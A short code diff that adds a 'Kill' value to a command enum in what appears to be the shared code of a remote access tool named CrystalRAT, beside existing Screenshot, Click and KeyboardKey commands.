@@ -15,5 +15,7 @@ namespace CrystalRATShared.Commands
         Screenshot = 4,
         Click = 5,
         KeyboardKey = 6,
+        Kill = 7,
+
     }
 }
